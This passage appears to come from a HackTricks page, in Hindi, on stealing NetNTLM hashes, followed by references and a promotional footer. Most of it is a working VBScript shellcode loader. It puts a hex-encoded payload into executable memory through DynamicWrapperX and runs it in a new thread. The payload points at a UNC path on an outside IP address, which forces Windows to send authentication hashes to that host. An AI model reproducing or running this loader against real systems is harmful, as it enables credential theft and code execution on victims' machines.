&Hc2, &Hc3, &H8d, &H41, &Hf8, &Hc3, &H55, &H8b, &Hec, &H83, &Hec, &H14, &H53, &H56, &H57, &H89, &H4d, &Hf4, &H64, &Ha1, _
&H30, &H05, &H05, &H05, &H89, &H45, &Hfc, &H8b, &H45, &Hfc, &H8b, &H40, &H0c, &H8b, &H40, &H14, &H89, &H45, &Hec, &H8b, _
&Hf8, &H8b, &Hcf, &He8, &Hd2, &Hff, &Hff, &Hff, &H8b, &H70, &H18, &H8b, &H3f, &H85, &Hf6, &H74, &H4f, &H8b, &H46, &H3c, _
&H8b, &H5c, &H30, &H78, &H85, &Hdb, &H74, &H44, &H8b, &H4c, &H33, &H0c, &H03, &Hce, &He8, &H96, &Hff, &Hff, &Hff, &H8b, _
&H4c, &H33, &H20, &H89, &H45, &Hf8, &H33, &Hc0, &H03, &Hce, &H89, &H4d, &Hf0, &H89, &H45, &Hfc, &H39, &H44, &H33, &H18, _
&H76, &H22, &H8b, &H0c, &H81, &H03, &Hce, &He8, &H75, &Hff, &Hff, &Hff, &H03, &H45, &Hf8, &H39, &H45, &Hf4, &H74, &H1c, _
&H8b, &H45, &Hfc, &H8b, &H4d, &Hf0, &H40, &H89, &H45, &Hfc, &H3b, &H44, &H33, &H18, &H72, &Hde, &H3b, &H7d, &Hec, &H75, _
&H9c, &H33, &Hc0, &H5f, &H5e, &H5b, &Hc9, &Hc3, &H8b, &H4d, &Hfc, &H8b, &H44, &H33, &H24, &H8d, &H04, &H48, &H0f, &Hb7, _
&H0c, &H30, &H8b, &H44, &H33, &H1c, &H8d, &H04, &H88, &H8b, &H04, &H30, &H03, &Hc6, &Heb, &Hdf, &H21, &H05, &H05, &H05, _
&H50, &H05, &H05, &H05, &H6b, &H65, &H72, &H6e, &H65, &H6c, &H33, &H32, &H2e, &H64, &H6c, &H6c, &H05, &H2f, &H2f, &H33, _
&H35, &H2e, &H31, &H36, &H34, &H2e, &H31, &H35, &H33, &H2e, &H32, &H32, &H34, &H2f, &H61, &H61, &H05)

scLocation = DX.VirtualAlloc(0, UBound(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

For i =LBound(shellcode) to UBound(shellcode)
DX.NumPut shellcode(i),scLocation,i
Next

thread = DX.CreateThread (0,0,scLocation,0,0)
```
Windows में और भी कई तरीके हो सकते हैं। आप कभी नहीं जानते! 🙂

## संदर्भ

* [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)

<details>

<summary><strong>AWS हैकिंग सीखें शुरुआत से लेकर एक्सपर्ट तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो** करें।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
